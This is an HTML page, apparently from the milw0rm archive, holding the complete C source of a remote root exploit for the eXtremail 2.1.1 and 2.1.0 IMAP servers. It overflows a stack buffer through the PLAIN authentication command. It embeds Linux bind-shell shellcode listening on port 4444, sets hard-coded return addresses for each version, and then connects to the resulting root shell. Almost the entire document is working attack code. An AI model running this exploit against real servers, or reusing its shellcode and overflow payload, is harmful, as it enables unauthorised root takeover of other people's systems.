<html><head><title>eXtremail <= 2.1.1 PLAIN authentication Remote Stack Overflow Exploit</title></head><pre>/* extremail-v6.c
 *
 * Copyright (c) 2006 by &lt;mu-b@digit-labs.org&gt;
 *
 * eXtremail &lt;=2.1.1 remote root exploit (x86-lnx)
 * by mu-b - Wed Oct 18 2006
 *
 * - Tested on: eXtremail 2.1.1 (lnx)
 *              eXtremail 2.1.0 (lnx)
 *
 * Stack overflow in ifParseAuthPlain
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2006!@$!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;

#define BUF_SIZE    2048
#define BBUF_SIZE   BUF_SIZE/3*4+1

#define NOP         0x41

#define AUTH_CMD    &quot;1 AUTHENTICATE PLAIN\n&quot;

#define DEF_PORT    143
#define PORT_IMAPD  DEF_PORT
#define PORT_SHELL  4444

static const char movshell_lnx[] =
  &quot;\x8b\x44\x24\x08&quot;        /* mov 0x08(%esp),%eax */
  &quot;\x40&quot;                    /* inc %eax */
  &quot;\xff\xe0&quot;;               /* jmp *%eax */

static const char bndshell_lnx[] =
  &quot;\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96&quot;
  &quot;\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56&quot;
  &quot;\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1&quot;
  &quot;\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0&quot;
  &quot;\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53&quot;
  &quot;\x89\xe1\xcd\x80&quot;;

#define NUM_TARGETS 2

struct target_t
{
  const char *name;
  const int len;
  const int zshell_pos;
  const char *zshell;
  const int fp_pos;
  const unsigned long fp;
};

/* fp = objdump -D smtpd | grep &quot;ff e0&quot; */
struct target_t targets[] = {
  {&quot;Linux eXtremail 2.1.1 (tar.gz)&quot;,
   256, 1, bndshell_lnx, 140, 0x08216357}
  ,
  {&quot;Linux eXtremail 2.1.0 (tar.gz)&quot;,
   256, 1, bndshell_lnx, 140, 0x08216377}
  ,
  {0}
};

static const char base64tab[] =
  &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;

static int base64 (const char *ibuf, char *obuf, size_t n);
static int sock_send (int sock, char *src, int len);
static int sock_recv (int sock, char *dst, int len);
static int sockami (char *host, int port);
static void shellami (int sock);
static void zbuffami (char *zbuf, struct target_t *trgt);

static int
base64 (const char *ibuf, char *obuf, size_t n)
{
  int a, b, c;
  int i, j;
  int d, e, f, g;

  a = b = c = 0;
  for (j = i = 0; i &lt; n; i += 3)
    {
      a = (unsigned char) ibuf[i];
      b = i + 1 &lt; n ? (unsigned char) ibuf[i + 1] : 0;
      c = i + 2 &lt; n ? (unsigned char) ibuf[i + 2] : 0;

      d = base64tab[a &gt;&gt; 2];
      e = base64tab[((a &amp; 3) &lt;&lt; 4) | (b &gt;&gt; 4)];
      f = base64tab[((b &amp; 15) &lt;&lt; 2) | (c &gt;&gt; 6)];
      g = base64tab[c &amp; 63];

      if (i + 1 &gt;= n)
        f = '=';
      if (i + 2 &gt;= n)
        g = '=';

      obuf[j++] = d, obuf[j++] = e;
      obuf[j++] = f, obuf[j++] = g;
    }

  obuf[j++] = '\n';
  obuf[j++] = '\0';

  return strlen (obuf);
}

static int
sock_send (int sock, char *src, int len)
{
  int sbytes;

  sbytes = send (sock, src, len, 0);

  return (sbytes);
}

static int
sock_recv (int sock, char *dst, int len)
{
  int rbytes;

  rbytes = recv (sock, dst, len, 0);
  if (rbytes &gt;= 0)
    dst[rbytes] = '\0';

  return (rbytes);
}

static int
sockami (char *host, int port)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int sock;

  fflush (stdout);
  if ((sock = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      perror (&quot;socket()&quot;);
      exit (-1);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      perror (&quot;gethostbyname()&quot;);
      exit (-1);
    }

  memset (&amp;address, 0, sizeof (address));
  memcpy ((char *) &amp;address.sin_addr, hp-&gt;h_addr, hp-&gt;h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  if (connect (sock, (struct sockaddr *) &amp;address, sizeof (address)) == -1)
    {
      perror (&quot;connect()&quot;);
      exit (EXIT_FAILURE);
    }

  return (sock);
}

static void
shellami (int sock)
{
  int n;
  fd_set rset;
  char recvbuf[1024], *cmd = &quot;id; uname -a; uptime\n&quot;;

  sock_send (sock, cmd, strlen (cmd));

  while (1)
    {
      FD_ZERO (&amp;rset);
      FD_SET (sock, &amp;rset);
      FD_SET (STDIN_FILENO, &amp;rset);
      select (sock + 1, &amp;rset, NULL, NULL, NULL);
      if (FD_ISSET (sock, &amp;rset))
        {
          if ((n = sock_recv (sock, recvbuf, sizeof (recvbuf) - 1)) &lt;= 0)
            {
              fprintf (stderr, &quot;Connection closed by foreign host.\n&quot;);
              exit (EXIT_SUCCESS);
            }
          printf (&quot;%s&quot;, recvbuf);
        }
      if (FD_ISSET (STDIN_FILENO, &amp;rset))
        {
          if ((n = read (STDIN_FILENO, recvbuf, sizeof (recvbuf) - 1)) &gt; 0)
            {
              recvbuf[n] = '\0';
              sock_send (sock, recvbuf, n);
            }
        }
    }
}

static void
zbuffami (char *zbuf, struct target_t *trgt)
{
  int i;
  char *fill = &quot;digitlabs&quot;;

  memset (zbuf, NOP, trgt-&gt;len);
  memcpy (zbuf + trgt-&gt;zshell_pos, trgt-&gt;zshell, strlen (trgt-&gt;zshell));

  zbuf[trgt-&gt;fp_pos + 1] = (u_char) (trgt-&gt;fp &amp; 0x000000ff);
  zbuf[trgt-&gt;fp_pos + 1 + 1] = (u_char) ((trgt-&gt;fp &amp; 0x0000ff00) &gt;&gt; 8);
  zbuf[trgt-&gt;fp_pos + 1 + 2] = (u_char) ((trgt-&gt;fp &amp; 0x00ff0000) &gt;&gt; 16);
  zbuf[trgt-&gt;fp_pos + 1 + 3] = (u_char) ((trgt-&gt;fp &amp; 0xff000000) &gt;&gt; 24);

  memcpy (zbuf + trgt-&gt;fp_pos + 1 + sizeof (u_long), movshell_lnx,
          strlen (movshell_lnx));

  /* rfc #2595 states &quot;\x00&lt;username&gt;\x00&lt;password&gt;&quot; */
  zbuf[0] = '\0';
  zbuf[trgt-&gt;fp_pos + 1 + sizeof (u_long) + strlen (movshell_lnx)] = '\0';

  for (i = trgt-&gt;fp_pos + 1 + sizeof (u_long) + strlen (movshell_lnx) + 1;
       i &lt; trgt-&gt;len; i++)
    zbuf[i] = fill[i % strlen (fill)];
}

int
main (int argc, char **argv)
{
  int sock, rbytes;
  char zbuf[BUF_SIZE], sbuf[BBUF_SIZE];
  struct target_t *trgt;

  printf (&quot;eXtremail &lt;=2.1.1 remote root exploit\n&quot;
          &quot;by: &lt;mu-b@digit-labs.org&gt;\n&quot;
          &quot;http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n&quot;);

  if (argc &lt;= 2)
    {
      fprintf (stderr, &quot;Usage: %s &lt;host&gt; &lt;target&gt;\n&quot;, argv[0]);
      exit (EXIT_SUCCESS);
    }

  if (atoi (argv[2]) &gt;= NUM_TARGETS)
    {
      fprintf (stderr, &quot;Only %d targets known!!\n&quot;, NUM_TARGETS);
      exit (EXIT_SUCCESS);
    }

  trgt = &amp;targets[atoi (argv[2])];
  printf (&quot;+Connecting to %s...&quot;, argv[1]);
  sock = sockami (argv[1], PORT_IMAPD);
  rbytes = sock_recv (sock, zbuf, sizeof (zbuf) - 1);
  if (rbytes &lt; 0)
    exit (EXIT_SUCCESS);
  printf (&quot;  connected\n&quot;);

  printf (&quot;fp: 0x%x\n&quot;, (int) trgt-&gt;fp);
  printf (&quot;buf len: %d\n&quot;, trgt-&gt;len);

  printf (&quot;+Building buffer with shellcode...&quot;);
  memset (zbuf, 0x00, sizeof (zbuf));
  zbuffami (zbuf, trgt);
  printf (&quot;  done\n&quot;);

  printf (&quot;+Building base64 encoded buffer...&quot;);
  base64 (zbuf, sbuf, trgt-&gt;len);
  printf (&quot;  done\n&quot;);

#ifdef DEBUG
  sleep (15);
#endif

  printf (&quot;+Making request...&quot;);
  sock_send (sock, AUTH_CMD, strlen (AUTH_CMD));
  rbytes = sock_recv (sock, zbuf, sizeof (zbuf) - 1);
  if (rbytes &lt; 0)
    exit (EXIT_SUCCESS);

  sock_send (sock, sbuf, strlen (sbuf));
  printf (&quot;  done\n&quot;);

  printf (&quot;+Waiting for the shellcode to be executed...\n&quot;);
  sleep (1);
  sock = sockami (argv[1], PORT_SHELL);
  printf (&quot;+Wh00t!\n\n&quot;);
  shellami (sock);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2007-10-15]</pre></html>